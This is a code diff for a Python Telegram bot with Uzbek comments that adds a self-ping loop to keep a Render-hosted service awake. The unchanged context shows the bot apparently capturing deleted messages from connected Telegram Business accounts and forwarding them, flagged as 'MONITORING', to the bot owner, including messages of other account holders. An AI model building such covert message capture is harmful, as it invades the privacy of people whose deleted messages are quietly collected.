@@ -2,6 +2,7 @@ import asyncio
 import json
 import logging
 import os
+import httpx
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import BusinessMessagesDeleted, Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command
@@ -17,6 +18,7 @@ def load_config():
 CONFIG = load_config()
 OWNER_ID = CONFIG["OWNER_ID"]
 MSGS = CONFIG["MESSAGES"]
+RENDER_URL = os.getenv("RENDER_EXTERNAL_URL")
 
 # 2. Flask Web Server (Render uchun)
 app = Flask(__name__)
@@ -27,15 +29,31 @@ def run_web():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
-# 3. Logging
+# 3. Self-ping (Botni uxlatmaslik uchun)
+async def self_ping():
+    if not RENDER_URL:
+        logging.warning("RENDER_EXTERNAL_URL topilmadi, self-ping ishlamaydi.")
+        return
+    
+    await asyncio.sleep(30)
+    while True:
+        try:
+            async with httpx.AsyncClient() as client:
+                await client.get(RENDER_URL)
+                logging.info("Self-ping: Bot uyg'oq saqlanmoqda.")
+        except Exception as e:
+            logging.error(f"Self-ping xatosi: {e}")
+        await asyncio.sleep(600) # Har 10 daqiqada
+
+# 4. Logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# 4. Botni sozlash
+# 5. Botni sozlash
 bot = Bot(token=CONFIG["BOT_TOKEN"])
 dp = Dispatcher()
 
-# 5. Baza funksiyalari
+# 6. Baza funksiyalari
 def get_db(file_name):
     if os.path.exists(file_name):
         with open(file_name, "r", encoding="utf-8") as f:
@@ -47,14 +65,13 @@ def save_db(file_name, db):
     with open(file_name, "w", encoding="utf-8") as f:
         json.dump(db, f, indent=4, ensure_ascii=False)
 
-# Foydalanuvchini ro'yxatga olish (Broadcast uchun)
 def register_user(user: types.User):
     users = get_db("users.json")
     if str(user.id) not in users:
         users[str(user.id)] = {"name": user.full_name, "username": user.username}
         save_db("users.json", users)
 
-# 6. Handlerlar (Admin Panel)
+# 7. Handlerlar
 @dp.message(Command("start"))
 async def start_cmd(m: Message):
     register_user(m.from_user)
@@ -101,7 +118,6 @@ async def process_broadcast(m: Message):
         except: pass
     await m.answer(f"✅ Xabar {count} ta foydalanuvchiga yetkazildi.")
 
-# 7. Biznes Handlerlar
 @dp.business_connection()
 async def on_business_connection(conn: BusinessConnection):
     conns = get_db(CONFIG.get("CONN_DB", "connections.json"))
@@ -111,7 +127,6 @@ async def on_business_connection(conn: BusinessConnection):
     else:
         if conn.id in conns: del conns[conn.id]
     save_db(CONFIG.get("CONN_DB", "connections.json"), conns)
-    logger.info(f"Biznes {status}: {conn.id}")
     try: await bot.send_message(OWNER_ID, f"🔔 Biznes hisob {status}: {conn.user.full_name}")
     except: pass
 
@@ -185,6 +200,10 @@ async def on_delete(ev: BusinessMessagesDeleted):
             if old["owner_id"] != OWNER_ID:
                 await send_res(OWNER_ID, f"🕵️ **MONITORING** ({old['owner_name']})\n")
 
-if __name__ == "__main__":
+async def main():
     Thread(target=run_web).start()
-    asyncio.run(dp.start_polling(bot))
+    asyncio.create_task(self_ping())
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
